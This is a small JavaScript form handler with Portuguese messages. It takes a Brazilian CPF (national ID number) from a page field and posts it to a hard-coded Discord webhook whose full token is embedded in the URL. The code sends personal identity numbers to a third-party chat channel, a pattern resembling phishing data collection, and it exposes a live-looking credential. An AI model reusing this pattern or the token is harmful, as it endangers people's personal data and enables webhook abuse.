document.getElementById('sendCpf').addEventListener('click', sendCpf);

async function sendCpf() {
    const cpf = document.getElementById('cpf').value;
    const webhookUrl = 'https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk'; // Substitua pelo seu webhook URL

    if (!cpf) {
        document.getElementById('message').innerText = 'Por favor, insira um CPF válido.';
        return;
    }

    const message = {
        content: `CPF recebido: \`${cpf}\``
    };

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        if (response.ok) {
            document.getElementById('message').innerText = 'CPF enviado com sucesso!';
        } else {
            document.getElementById('message').innerText = 'Erro ao enviar CPF.';
        }
    } catch (error) {
        console.error('Erro ao enviar CPF:', error);
        document.getElementById('message').innerText = 'Erro ao enviar CPF.';
    }
}
